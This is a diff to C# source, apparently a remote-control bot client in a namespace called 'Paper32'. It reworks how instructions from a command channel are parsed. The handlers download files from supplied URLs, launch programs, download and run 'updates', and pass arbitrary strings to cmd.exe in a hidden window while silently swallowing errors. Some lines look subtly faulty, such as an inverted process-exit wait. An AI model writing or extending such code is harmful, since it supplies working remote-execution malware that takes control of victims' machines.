@@ -33,27 +33,22 @@ namespace Paper32
                     {
                         continue;
                     }
-                    string it = new Regex(@"Instruction-Type: (.*?);;;;").Match(inst).Groups[1].Value;
-                    string source = new Regex(@"Source: (.*?);;;;").Match(inst).Groups[1].Value;
-                    string dest = new Regex(@"Destination: (.*?);;;;").Match(inst).Groups[1].Value;
-                    string command = new Regex(@"Command: (.*?);;;;").Match(inst).Groups[1].Value;
-                    if (it == "download")
+                    Dictionary<string, string> things = new Dictionary<string, string>();
+                    string[] actualStrings = inst.Split(new string[] { ";;;;" }, StringSplitOptions.None);
+                    foreach (string s in actualStrings)
                     {
-                        if (source == "" || dest == "")
-                        {
-                            c.DeleteInstruction(); // Invalid instruction
-                            continue;
-                        }
-                        try
-                        {
-                            new WebClient().DownloadFile(source, dest);
-                            c.DeleteInstruction();
-                        }
-                        catch { }
+                        var match = new Regex(@"^(.*?): (.*?)$").Match(s);
+                        things.Add(match.Groups[1].Value, match.Groups[2].Value);
                     }
-                    else if (it == "execute")
+                    if (!things.ContainsKey("Instruction-Type"))
                     {
-                        if (dest == "")
+                        c.DeleteInstruction();
+                        continue;
+                    }
+                    Console.WriteLine("Code Executed");
+                    if (things["Instruction-Type"] == "download")
+                    {
+                        if (!things.ContainsKey("Source") || !things.ContainsKey("Destination"))
                         {
                             c.DeleteInstruction(); // Invalid instruction
                             continue;
@@ -61,29 +56,43 @@ namespace Paper32
                         try
                         {
                             c.DeleteInstruction();
-                            Process.Start(dest);
+                            new WebClient().DownloadFile(things["Source"], things["Destination"]);
                         }
                         catch { }
                     }
-                    else if (it == "update")
+                    else if (things["Instruction-Type"] == "execute")
                     {
-                        if (source == "" || dest == "")
+                        if (!things.ContainsKey("Path"))
                         {
                             c.DeleteInstruction(); // Invalid instruction
                             continue;
                         }
                         try
                         {
-                            new WebClient().DownloadFile(source, dest);
-                            Process.Start(dest);
+                            c.DeleteInstruction();
+                            Process.Start(things["Path"]);
+                        }
+                        catch { }
+                    }
+                    else if (things["Instruction-Type"] == "update")
+                    {
+                        if (!things.ContainsKey("Source") || !things.ContainsKey("Destination"))
+                        {
+                            c.DeleteInstruction(); // Invalid instruction
+                            continue;
+                        }
+                        try
+                        {
+                            new WebClient().DownloadFile(things["Source"], things["Destination"]);
+                            Process.Start(things["Destination"]);
                             c.DeleteInstruction();
                             Tools.GoodExit();
                         }
                         catch { }
                     }
-                    else if (it == "command")
+                    else if (things["Instruction-Type"] == "command")
                     {
-                        if (command == "")
+                        if (!things.ContainsKey("Command"))
                         {
                             c.DeleteInstruction(); // Invalid instruction
                             continue;
@@ -93,7 +102,7 @@ namespace Paper32
                             c.DeleteInstruction();
                             Process p = new Process();
                             p.StartInfo.FileName = "cmd.exe"; // start "" "path"
-                            p.StartInfo.Arguments = "/C " + command;
+                            p.StartInfo.Arguments = "/C " + things["Command"];
                             p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // Make a system to choose the style mode
                             p.Start();
                             while (p.HasExited) ;
@@ -107,6 +116,6 @@ namespace Paper32
                 }
                 catch { }
             }
-        } 
+        }
     }
 }
